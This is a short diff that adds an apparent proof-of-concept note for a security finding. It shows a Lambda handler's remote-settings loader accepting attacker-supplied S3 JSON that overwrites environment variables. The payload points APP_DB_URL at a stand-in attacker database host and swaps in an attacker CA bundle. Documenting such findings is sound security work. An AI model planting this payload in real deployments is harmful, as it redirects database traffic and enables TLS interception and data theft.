@@ -1,0 +1,4 @@
+No HTTP request — direct invocation of the target function (S3 stubbed):
+  zappa.handler.LambdaHandler.load_remote_settings(bucket,key) with attacker S3 JSON
+  {"APP_DB_URL":"postgres://attacker-db.evil.example/steal","REQUESTS_CA_BUNDLE":"/tmp/attacker-ca.pem"}.
+  Result: existing os.environ["APP_DB_URL"] overwritten. See automation.py _DRIVER.
